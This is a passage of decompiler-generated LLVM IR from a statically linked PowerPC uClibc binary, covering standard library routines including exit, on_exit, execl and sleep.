  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000d328.pre.pre = load i32, i32* @r8, align 4
  br i1 %v3_1000d2e4, label %dec_label_pc_1000d318, label %dec_label_pc_1000d300

dec_label_pc_1000d300:                            ; preds = %dec_label_pc_1000d2e4
  %v3_1000d300 = icmp ugt i32 %v0_1000d328.pre.pre, %tmp28
  br i1 %v3_1000d300, label %dec_label_pc_1000d308, label %dec_label_pc_1000d318

dec_label_pc_1000d308:                            ; preds = %dec_label_pc_1000d300
  %v0_1000d308 = call i32 @__errno_location()
  %v2_1000d310 = inttoptr i32 %v0_1000d308 to i32*
  store i32 34, i32* %v2_1000d310, align 4
  %v0_1000d314 = load i32, i32* @r31, align 4
  store i32 %v0_1000d314, i32* @r8, align 4
  %v0_1000d318.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d318

dec_label_pc_1000d318:                            ; preds = %dec_label_pc_1000d2e4, %dec_label_pc_1000d300, %dec_label_pc_1000d308
  %v0_1000d328.pre = phi i32 [ %v0_1000d328.pre.pre, %dec_label_pc_1000d300 ], [ %v0_1000d314, %dec_label_pc_1000d308 ], [ %v0_1000d328.pre.pre, %dec_label_pc_1000d2e4 ]
  %v0_1000d318 = phi i32 [ %v0_1000d2e8, %dec_label_pc_1000d300 ], [ %v0_1000d318.pre, %dec_label_pc_1000d308 ], [ %v0_1000d2e8, %dec_label_pc_1000d2e4 ]
  %v3_1000d318 = icmp eq i32 %v0_1000d318, 0
  br i1 %v3_1000d318, label %dec_label_pc_1000d324, label %dec_label_pc_1000d320

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d318
  %v1_1000d320 = sub i32 0, %v0_1000d328.pre
  store i32 %v1_1000d320, i32* @r8, align 4
  br label %dec_label_pc_1000d324

dec_label_pc_1000d324:                            ; preds = %dec_label_pc_1000d318, %dec_label_pc_1000d320
  %v0_1000d328 = phi i32 [ %v1_1000d320, %dec_label_pc_1000d320 ], [ %v0_1000d328.pre, %dec_label_pc_1000d318 ]
  ret i32 %v0_1000d328

; uselistorder directives
  uselistorder i32 %v0_1000d328.pre, { 1, 0 }
  uselistorder i32 %v0_1000d328.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000d2d0, { 1, 0 }
  uselistorder i32 %v1_1000d298, { 1, 0 }
  uselistorder i32 %v1_1000d27c, { 2, 1, 0 }
  uselistorder i32 %v1_1000d278, { 1, 0 }
  uselistorder i32 %v1_1000d270, { 1, 0 }
  uselistorder i32 %v3_1000d264, { 1, 0 }
  uselistorder i32 %v0_1000d2cc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d26c, { 0, 2, 1 }
  uselistorder i32 %v0_1000d260, { 2, 0, 1 }
  uselistorder i32 %v2_1000d24c, { 1, 0, 2 }
  uselistorder i32 %v1_1000d224, { 1, 0 }
  uselistorder i32 %v1_1000d210, { 1, 0, 2 }
  uselistorder i32 %v0_1000d1ec, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 2147483647, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d324, { 1, 0 }
  uselistorder label %dec_label_pc_1000d318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d2e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d29c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d264, { 1, 0 }
  uselistorder label %dec_label_pc_1000d238, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d22c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1b8, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000d354 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000d36c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32))
  store i32 268489592, i32* @lr, align 4
  %v1_1000d374 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c1dc.347 to i32))
  %v3_1000d37c = load i32, i32* @global_var_1002c38c.348, align 4
  %v3_1000d380 = icmp eq i32 %v3_1000d37c, 0
  br i1 %v3_1000d380, label %dec_label_pc_1000d394, label %dec_label_pc_1000d388

dec_label_pc_1000d388:                            ; preds = %entry
  %v1_1000d390 = call i32 @unknown_0()
  br label %dec_label_pc_1000d394

dec_label_pc_1000d394:                            ; preds = %entry, %dec_label_pc_1000d388
  store i32 %v2_1000d354, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000d3a0.349 to i32), i32* @lr, align 4
  %v0_1000d39c = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_1000d39c, i32* @r3, align 4
  store i32 268489636, i32* @lr, align 4
  %v1_1000d3a0 = call i32 @__GI___uClibc_fini(i32 %v0_1000d39c)
  store i32 268489656, i32* @lr, align 4
  %v2_1000d3b4 = call i32 @_stdio_term(i32 %v1_1000d3a0, i32 268475252)
  %v0_1000d3b8 = load i32, i32* @r31, align 4
  %v1_1000d3bc = call i32 @__GI__exit(i32 %v0_1000d3b8)
  ret i32 %v1_1000d3bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000d394, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000d3c0 = load i32, i32* @lr, align 4
  store i32 %v0_1000d3c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000d3dc.350 to i32), i32* @lr, align 4
  %v0_1000d3d8 = call i32 @__new_exitfn()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v3_1000d3e0 = icmp eq i32 %v0_1000d3d8, 0
  br i1 %v3_1000d3e0, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d3e8

dec_label_pc_1000d3e8:                            ; preds = %entry
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000d3ec = load i32, i32* @r31, align 4
  %v2_1000d3ec = add i32 %v0_1000d3d8, 4
  %v3_1000d3ec = inttoptr i32 %v2_1000d3ec to i32*
  store i32 %v0_1000d3ec, i32* %v3_1000d3ec, align 4
  %v0_1000d3f0 = load i32, i32* @r30, align 4
  %v2_1000d3f0 = add i32 %v0_1000d3d8, 8
  %v3_1000d3f0 = inttoptr i32 %v2_1000d3f0 to i32*
  store i32 %v0_1000d3f0, i32* %v3_1000d3f0, align 4
  %v0_1000d3f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d3f4 = inttoptr i32 %v0_1000d3d8 to i32*
  store i32 %v0_1000d3f4, i32* %v2_1000d3f4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d3fc

dec_label_pc_1000d3fc:                            ; preds = %entry, %dec_label_pc_1000d3e8
  %v0_1000d3fc = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000d3e8 ]
  store i32 %v0_1000d3c0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d3fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000d3fc, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000d414 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000d430 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000d430, i32* %r0.global-to-local, align 4
  %v2_1000d438 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000d430, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d464

dec_label_pc_1000d464:                            ; preds = %dec_label_pc_1000d494, %entry
  %v0_1000d468 = phi i32 [ 0, %entry ], [ %v1_1000d468, %dec_label_pc_1000d494 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000d438, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000d494 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000d494 ]
  %v4_1000d464 = zext i8 %stack_var_-56.0 to i32
  %v1_1000d468 = add i32 %v0_1000d468, 1
  %v1_1000d470 = mul nuw nsw i32 %v4_1000d464, 4
  store i32 %v1_1000d470, i32* %r0.global-to-local, align 4
  %v2_1000d474 = add i32 %v1_1000d470, %v2_1000d430
  store i32 %v2_1000d474, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000d488, label %dec_label_pc_1000d480

dec_label_pc_1000d480:                            ; preds = %dec_label_pc_1000d464
  %v1_1000d478 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000d494

dec_label_pc_1000d488:                            ; preds = %dec_label_pc_1000d464
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000d48c = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000d48c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d494

dec_label_pc_1000d494:                            ; preds = %dec_label_pc_1000d480, %dec_label_pc_1000d488
  %stack_var_-52.1 = phi i32 [ %v1_1000d48c, %dec_label_pc_1000d488 ], [ %stack_var_-52.0, %dec_label_pc_1000d480 ]
  %v0_1000d494 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000d488 ], [ %v2_1000d474, %dec_label_pc_1000d480 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000d488 ], [ %v1_1000d478, %dec_label_pc_1000d480 ]
  %v1_1000d494 = inttoptr i32 %v0_1000d494 to i32*
  %v2_1000d494 = load i32, i32* %v1_1000d494, align 4
  store i32 %v2_1000d494, i32* %r0.global-to-local, align 4
  %v3_1000d498 = icmp eq i32 %v2_1000d494, 0
  br i1 %v3_1000d498, label %dec_label_pc_1000d4a0, label %dec_label_pc_1000d464

dec_label_pc_1000d4a0:                            ; preds = %dec_label_pc_1000d494
  %v1_1000d4a0 = mul i32 %v1_1000d468, 4
  store i32 %v4_1000d414, i32* %r0.global-to-local, align 4
  %v1_1000d4a8 = add i32 %v1_1000d4a0, 34
  store i32 %v1_1000d468, i32* %ctr.global-to-local, align 4
  %v1_1000d4b0 = call i32 @__asm_rlwinm(i32 %v1_1000d4a8, i32 0, i32 0, i32 27)
  %v1_1000d4b8 = load i32, i32* @r1, align 4
  %v3_1000d4b8 = sub i32 %v1_1000d4b8, %v1_1000d4b0
  %v4_1000d4b8 = inttoptr i32 %v3_1000d4b8 to i32*
  store i32 %v4_1000d414, i32* %v4_1000d4b8, align 4
  %v1_1000d4bc = add i32 %v3_1000d4b8, 23
  store i32 %v1_1000d4bc, i32* %r0.global-to-local, align 4
  %v1_1000d4c0 = call i32 @__asm_rlwinm(i32 %v1_1000d4bc, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000d4c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d4c8 = inttoptr i32 %v1_1000d4c0 to i32*
  store i32 %v0_1000d4c8, i32* %v2_1000d4c8, align 4
  store i32 %v1_1000d4c0, i32* %r11.global-to-local, align 4
  %v0_1000d4d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d4d0 = trunc i32 %v0_1000d4d0 to i8
  store i32 %v2_1000d430, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d430, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000d4e4

dec_label_pc_1000d4e4:                            ; preds = %dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge, %dec_label_pc_1000d4a0
  %v0_1000d4e8 = phi i32 [ %v1_1000d4c0, %dec_label_pc_1000d4a0 ], [ %v0_1000d4e8.pre, %dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000d438, %dec_label_pc_1000d4a0 ], [ %stack_var_-52.3, %dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000d4d0, %dec_label_pc_1000d4a0 ], [ %stack_var_-56.3, %dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge ]
  %v1_1000d4e8 = add i32 %v0_1000d4e8, 4
  store i32 %v1_1000d4e8, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000d50c, label %dec_label_pc_1000d4fc

dec_label_pc_1000d4fc:                            ; preds = %dec_label_pc_1000d4e4
  %v4_1000d4e4 = zext i8 %stack_var_-56.2 to i32
  %v1_1000d4f4 = add i8 %stack_var_-56.2, 1
  %v1_1000d4f0 = mul nuw nsw i32 %v4_1000d4e4, 4
  %v3_1000d4fc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000d4fc, i32* %r0.global-to-local, align 4
  %v2_1000d504 = add i32 %v3_1000d4fc, %v1_1000d4f0
  br label %dec_label_pc_1000d518

dec_label_pc_1000d50c:                            ; preds = %dec_label_pc_1000d4e4
  %v1_1000d510 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000d510, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d518

dec_label_pc_1000d518:                            ; preds = %dec_label_pc_1000d4fc, %dec_label_pc_1000d50c
  %stack_var_-52.3 = phi i32 [ %v1_1000d510, %dec_label_pc_1000d50c ], [ %stack_var_-52.2, %dec_label_pc_1000d4fc ]
  %v0_1000d518 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000d50c ], [ %v2_1000d504, %dec_label_pc_1000d4fc ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000d50c ], [ %v1_1000d4f4, %dec_label_pc_1000d4fc ]
  %v1_1000d518 = inttoptr i32 %v0_1000d518 to i32*
  %v2_1000d518 = load i32, i32* %v1_1000d518, align 4
  store i32 %v2_1000d518, i32* %r0.global-to-local, align 4
  %v2_1000d51c = inttoptr i32 %v1_1000d4e8 to i32*
  store i32 %v2_1000d518, i32* %v2_1000d51c, align 4
  %v0_1000d520 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d520 = add i32 %v0_1000d520, -1
  store i32 %v1_1000d520, i32* %ctr.global-to-local, align 4
  %v2_1000d520 = icmp eq i32 %v1_1000d520, 0
  br i1 %v2_1000d520, label %dec_label_pc_1000d524, label %dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge

dec_label_pc_1000d518.dec_label_pc_1000d4e4_crit_edge: ; preds = %dec_label_pc_1000d518
  %v0_1000d4e8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d4e4

dec_label_pc_1000d524:                            ; preds = %dec_label_pc_1000d518
  %v3_1000d528 = load i32, i32* @global_var_1002c398.351, align 4
  store i32 268490032, i32* @lr, align 4
  %v2_1000d52c = call i32 @__GI_execve(i32 %v3_1000d528, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v0_1000d530 = load i32, i32* @r1, align 4
  %v1_1000d530 = inttoptr i32 %v0_1000d530 to i32*
  %v2_1000d530 = load i32, i32* %v1_1000d530, align 4
  store i32 %v2_1000d530, i32* %r11.global-to-local, align 4
  %v1_1000d534 = add i32 %v2_1000d530, 4
  %v2_1000d534 = inttoptr i32 %v1_1000d534 to i32*
  %v3_1000d534 = load i32, i32* %v2_1000d534, align 4
  store i32 %v3_1000d534, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000d52c

; uselistorder directives
  uselistorder i32 %v1_1000d520, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000d470, { 1, 0 }
  uselistorder i32 %v1_1000d468, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000d430, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i8 1, { 0, 1, 7, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 20, 21, 4, 5, 6, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder label %dec_label_pc_1000d518, { 1, 0 }
  uselistorder label %dec_label_pc_1000d494, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* @r8, align 4
  %v3_1000d548 = icmp eq i32 %arg1, 0
  br i1 %v3_1000d548, label %dec_label_pc_1000d6fc, label %dec_label_pc_1000d578.lr.ph

dec_label_pc_1000d578.lr.ph:                      ; preds = %entry
  %v2_1000d56c = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000d56c, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000d57842 = add i32 %v2_1000d56c, 132
  %v3_1000d57843 = inttoptr i32 %v2_1000d57842 to i32*
  store i32 0, i32* %v3_1000d57843, align 4
  %v0_1000d57c44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d57c45 = add i32 %v0_1000d57c44, -1
  store i32 %v1_1000d57c45, i32* %r11.global-to-local, align 4
  %v1_1000d58046 = mul i32 %v1_1000d57c45, 4
  %v1_1000d58447 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000d58448 = add i32 %v1_1000d58447, %v1_1000d58046
  %v0_1000d58849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d58850 = add i32 %v0_1000d58849, -1
  store i32 %v1_1000d58850, i32* %ctr.global-to-local, align 4
  %v2_1000d58851 = icmp eq i32 %v1_1000d58850, 0
  br i1 %v2_1000d58851, label %dec_label_pc_1000d58c, label %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge

dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge: ; preds = %dec_label_pc_1000d578.lr.ph, %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge
  %v2_1000d58452 = phi i32 [ %v2_1000d584, %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge ], [ %v2_1000d58448, %dec_label_pc_1000d578.lr.ph ]
  %v0_1000d578.pre = load i32, i32* @r10, align 4
  %v2_1000d578 = add i32 %v2_1000d58452, 8
  %v3_1000d578 = inttoptr i32 %v2_1000d578 to i32*
  store i32 %v0_1000d578.pre, i32* %v3_1000d578, align 4
  %v0_1000d57c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d57c = add i32 %v0_1000d57c, -1
  store i32 %v1_1000d57c, i32* %r11.global-to-local, align 4
  %v1_1000d580 = mul i32 %v1_1000d57c, 4
  %v1_1000d584 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000d584 = add i32 %v1_1000d584, %v1_1000d580
  %v0_1000d588 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d588 = add i32 %v0_1000d588, -1
  store i32 %v1_1000d588, i32* %ctr.global-to-local, align 4
  %v2_1000d588 = icmp eq i32 %v1_1000d588, 0
  br i1 %v2_1000d588, label %dec_label_pc_1000d58c, label %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge

dec_label_pc_1000d58c:                            ; preds = %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge, %dec_label_pc_1000d578.lr.ph
  %v0_1000d5a0.pre = load i32, i32* @r8, align 4
  %v2_1000d58c = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000d58c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000d58c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000d5a0.pre, i32* %stack_var_-440, align 4
  %v0_1000d5a4 = call i32 @__sigaddset()
  store i32 %v0_1000d5a4, i32* %r3.global-to-local, align 4
  %v1_1000d5a8 = icmp slt i32 %v0_1000d5a4, 0
  br i1 %v1_1000d5a8, label %dec_label_pc_1000d704, label %dec_label_pc_1000d5b0

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d58c
  %v2_1000d5b0 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268490180, i32* @lr, align 4
  %v3_1000d5c0 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000d58c, i32 %v2_1000d5b0)
  store i32 %v3_1000d5c0, i32* %r3.global-to-local, align 4
  %v3_1000d5c4 = icmp eq i32 %v3_1000d5c0, 0
  br i1 %v3_1000d5c4, label %dec_label_pc_1000d5cc, label %dec_label_pc_1000d704

dec_label_pc_1000d5cc:                            ; preds = %dec_label_pc_1000d5b0
  store i32 %v2_1000d5b0, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000d5d4 = call i32 @__sigismember()
  store i32 %v0_1000d5d4, i32* %r3.global-to-local, align 4
  %v3_1000d5d8 = icmp eq i32 %v0_1000d5d4, 0
  br i1 %v3_1000d5d8, label %dec_label_pc_1000d5f8.lr.ph, label %dec_label_pc_1000d6c4

dec_label_pc_1000d5f8.lr.ph:                      ; preds = %dec_label_pc_1000d5cc
  store i32 %v2_1000d56c, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000d57843, align 4
  %v0_1000d5fc33 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d5fc34 = add i32 %v0_1000d5fc33, -1
  store i32 %v1_1000d5fc34, i32* %r11.global-to-local, align 4
  %v1_1000d60035 = mul i32 %v1_1000d5fc34, 4
  %v1_1000d60436 = load i32, i32* @r8, align 4
  %v2_1000d60437 = add i32 %v1_1000d60436, %v1_1000d60035
  %v0_1000d60838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d60839 = add i32 %v0_1000d60838, -1
  store i32 %v1_1000d60839, i32* %ctr.global-to-local, align 4
  %v2_1000d60840 = icmp eq i32 %v1_1000d60839, 0
  br i1 %v2_1000d60840, label %dec_label_pc_1000d60c, label %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge

dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge: ; preds = %dec_label_pc_1000d5f8.lr.ph, %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge
  %v2_1000d60441 = phi i32 [ %v2_1000d604, %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge ], [ %v2_1000d60437, %dec_label_pc_1000d5f8.lr.ph ]
  %v0_1000d5f8.pre = load i32, i32* @r10, align 4
  %v2_1000d5f8 = add i32 %v2_1000d60441, 8
  %v3_1000d5f8 = inttoptr i32 %v2_1000d5f8 to i32*
  store i32 %v0_1000d5f8.pre, i32* %v3_1000d5f8, align 4
  %v0_1000d5fc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d5fc = add i32 %v0_1000d5fc, -1
  store i32 %v1_1000d5fc, i32* %r11.global-to-local, align 4
  %v1_1000d600 = mul i32 %v1_1000d5fc, 4
  %v1_1000d604 = load i32, i32* @r8, align 4
  %v2_1000d604 = add i32 %v1_1000d604, %v1_1000d600
  %v0_1000d608 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d608 = add i32 %v0_1000d608, -1
  store i32 %v1_1000d608, i32* %ctr.global-to-local, align 4
  %v2_1000d608 = icmp eq i32 %v1_1000d608, 0
  br i1 %v2_1000d608, label %dec_label_pc_1000d60c, label %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge

dec_label_pc_1000d60c:                            ; preds = %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge, %dec_label_pc_1000d5f8.lr.ph
  store i32 %v2_1000d58c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000d614 = call i32 @__sigaddset()
  store i32 %v0_1000d614, i32* %r3.global-to-local, align 4
  %v1_1000d618 = icmp slt i32 %v0_1000d614, 0
  br i1 %v1_1000d618, label %dec_label_pc_1000d704, label %dec_label_pc_1000d620

dec_label_pc_1000d620:                            ; preds = %dec_label_pc_1000d60c
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000d628 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268490288, i32* @lr, align 4
  %v4_1000d62c = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_1000d628)
  store i32 %v4_1000d62c, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000d62c, -1
  br i1 %tmp30, label %dec_label_pc_1000d660, label %dec_label_pc_1000d638

dec_label_pc_1000d638:                            ; preds = %dec_label_pc_1000d620
  %v0_1000d638 = call i32 @__errno_location()
  store i32 %v0_1000d638, i32* %r3.global-to-local, align 4
  %v1_1000d640 = inttoptr i32 %v0_1000d638 to i32*
  %v2_1000d640 = load i32, i32* %v1_1000d640, align 4
  store i32 %v0_1000d638, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268490324, i32* @lr, align 4
  %v3_1000d650 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000d5b0, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000d658 = inttoptr i32 %v0_1000d638 to i32*
  store i32 %v2_1000d640, i32* %v2_1000d658, align 4
  %v0_1000d718.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d708

dec_label_pc_1000d660:                            ; preds = %dec_label_pc_1000d620
  %v3_1000d660 = load i32, i32* %stack_var_-176, align 4
  %v3_1000d66c = icmp eq i32 %v3_1000d660, 1
  br i1 %v3_1000d66c, label %dec_label_pc_1000d674, label %dec_label_pc_1000d6a8

dec_label_pc_1000d674:                            ; preds = %dec_label_pc_1000d660
  store i32 %v2_1000d56c, i32* %r3.global-to-local, align 4
  store i32 268490368, i32* @lr, align 4
  %v2_1000d67c = call i32 @nanosleep(i32 %v2_1000d56c, i32 %v2_1000d56c)
  store i32 %v2_1000d67c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000d67c, i32* @r31, align 4
  %v0_1000d684 = call i32 @__errno_location()
  store i32 %v0_1000d684, i32* %r3.global-to-local, align 4
  store i32 %v0_1000d684, i32* %r29.global-to-local, align 4
  %v1_1000d694 = inttoptr i32 %v0_1000d684 to i32*
  %v2_1000d694 = load i32, i32* %v1_1000d694, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268490400, i32* @lr, align 4
  %v3_1000d69c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000d5b0, i32 0)
  store i32 %v3_1000d69c, i32* %r3.global-to-local, align 4
  %v1_1000d6a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d6a0 = inttoptr i32 %v1_1000d6a0 to i32*
  store i32 %v2_1000d694, i32* %v2_1000d6a0, align 4
  %v0_1000d6d0.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d6d0

dec_label_pc_1000d6a8:                            ; preds = %dec_label_pc_1000d660
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268490424, i32* @lr, align 4
  %v3_1000d6b4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000d5b0, i32 0)
  br label %dec_label_pc_1000d6c4

dec_label_pc_1000d6c4:                            ; preds = %dec_label_pc_1000d5cc, %dec_label_pc_1000d6a8
  store i32 %v2_1000d56c, i32* %r3.global-to-local, align 4
  store i32 268490444, i32* @lr, align 4
  %v2_1000d6c8 = call i32 @nanosleep(i32 %v2_1000d56c, i32 %v2_1000d56c)
  store i32 %v2_1000d6c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d6d0

dec_label_pc_1000d6d0:                            ; preds = %dec_label_pc_1000d674, %dec_label_pc_1000d6c4
  %v0_1000d6d0 = phi i32 [ %v0_1000d6d0.pr, %dec_label_pc_1000d674 ], [ %v2_1000d6c8, %dec_label_pc_1000d6c4 ]
  %v3_1000d6d0 = icmp eq i32 %v0_1000d6d0, 0
  br i1 %v3_1000d6d0, label %dec_label_pc_1000d6fc, label %dec_label_pc_1000d6d8

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d6d0
  %v3_1000d6e8 = load i32, i32* %stack_var_-440, align 4
  %v0_1000d6ec = call i32 @__asm_mfcr()
  store i32 %v0_1000d6ec, i32* %r3.global-to-local, align 4
